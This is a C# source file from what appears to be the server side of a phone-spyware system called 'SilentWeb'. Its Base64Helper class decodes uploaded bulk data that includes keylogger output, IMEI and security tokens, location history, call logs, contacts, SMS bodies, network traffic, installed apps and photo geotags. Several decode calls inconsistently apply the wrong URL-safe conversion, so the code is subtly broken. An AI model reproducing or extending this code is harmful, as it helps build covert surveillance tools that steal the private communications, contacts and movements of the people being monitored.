using DataLayer;
using DataLayer.Models;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Web;

namespace SilentWeb.Services
{
    public class Base64Helper
    {
        public static string Encode(string nonBase64String)
        {
            return MakeUrlSafe(Convert.ToBase64String(System.Text.Encoding.UTF8.GetBytes(nonBase64String)));
        }

        public static string Decode(string base64String)
        {

            return System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(base64String)));
        }

        public static BulkDataModel DecodeBulk(BulkDataModel bulkData)
        {
            if (bulkData != null)
            {
                if (DataChecker.CheckAuthentication(bulkData.Authentication))
                {
                    bulkData.Authentication.IMEI = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Authentication.IMEI)));
                    bulkData.Authentication.SecToken = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlSafe(bulkData.Authentication.SecToken)));
                }

                if (DataChecker.CheckKeylogger(bulkData.Keylogger))
                {
                    bulkData.Keylogger.Info = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlSafe(bulkData.Keylogger.Info)));
                    bulkData.Keylogger.Hash = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlSafe(bulkData.Keylogger.Hash)));
                }

                if (DataChecker.CheckLocation(bulkData.Location))
                {
                    for (int i=0; i<bulkData.Location.Locations.Count; i++)
                    {
                        bulkData.Location.Locations[i].Latitude = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Location.Locations[i].Latitude)));
                        bulkData.Location.Locations[i].Longitude = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Location.Locations[i].Longitude)));
                        bulkData.Location.Locations[i].Date = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Location.Locations[i].Date)));
                    }
                    if (bulkData.Location.Hash != null)
                    {
                        bulkData.Location.Hash = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Location.Hash)));
                    }
                }

                if (DataChecker.CheckCalls(bulkData.CallHistory))
                {
                    for (int i = 0; i < bulkData.CallHistory.Calls.Count; i++)
                    {
                        bulkData.CallHistory.Calls[i].Date = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.CallHistory.Calls[i].Date)));
                        bulkData.CallHistory.Calls[i].Direction = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.CallHistory.Calls[i].Direction)));
                        bulkData.CallHistory.Calls[i].Duration = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.CallHistory.Calls[i].Duration)));
                        bulkData.CallHistory.Calls[i].Number = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.CallHistory.Calls[i].Number)));
                    }
                }

                if (DataChecker.CheckContacts(bulkData.Contacts))
                {
                    for (int i = 0; i < bulkData.Contacts.ContactList.Count; i++)
                    {
                        bulkData.Contacts.ContactList[i].Name = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Contacts.ContactList[i].Name)));
                        bulkData.Contacts.ContactList[i].Number = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Contacts.ContactList[i].Number)));
                    }
                }

                if (DataChecker.CheckMessages(bulkData.Messages))
                {
                    for (int i = 0; i < bulkData.Messages.Messages.Count; i++)
                    {
                        bulkData.Messages.Messages[i].Address = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Messages.Messages[i].Address)));
                        bulkData.Messages.Messages[i].State = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Messages.Messages[i].State)));
                        bulkData.Messages.Messages[i].Date = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Messages.Messages[i].Date)));
                        bulkData.Messages.Messages[i].Type = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Messages.Messages[i].Type)));
                        bulkData.Messages.Messages[i].Body = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Messages.Messages[i].Body)));
                    }
                }

                if (DataChecker.CheckTrafic(bulkData.Trafic))
                {
                    bulkData.Trafic.Trafic = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Trafic.Trafic)));
                    bulkData.Trafic.Hash = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Trafic.Hash)));
                }

                if (DataChecker.CheckApplications(bulkData.Applications))
                {
                    for (int i = 0; i < bulkData.Applications.Applications.Count; i++)
                    {
                        bulkData.Applications.Applications[i].Name = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Applications.Applications[i].Name)));
                    }
                }

                if (DataChecker.CheckPhotos(bulkData.Photos))
                {
                    for (int i=0; i<bulkData.Photos.Photos.Count; i++)
                    {
                        bulkData.Photos.Photos[i].Date = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Photos.Photos[i].Date)));
                        bulkData.Photos.Photos[i].Latitude = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Photos.Photos[i].Latitude)));
                        bulkData.Photos.Photos[i].Longitude = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Photos.Photos[i].Longitude)));
                    }
                }

                if (DataChecker.CheckMetadata(bulkData.Metadata))
                {
                    for(int i = 0; i<bulkData.Metadata.Metadata.Count; i++) {
                        bulkData.Metadata.Metadata[i] = System.Text.Encoding.UTF8.GetString(Convert.FromBase64String(MakeUrlUnsafe(bulkData.Metadata.Metadata[i])));
                    }
                }
                return bulkData;
            }
            return null;
        }

        public static string MakeUrlSafe(string value)
        {
            return value.Replace('+', '-').Replace('/', '_');
        }

        public static string MakeUrlUnsafe(string value)
        {
            string newValue = value.Replace('-', '+').Replace('_', '/');
            return newValue;
        }
    }
}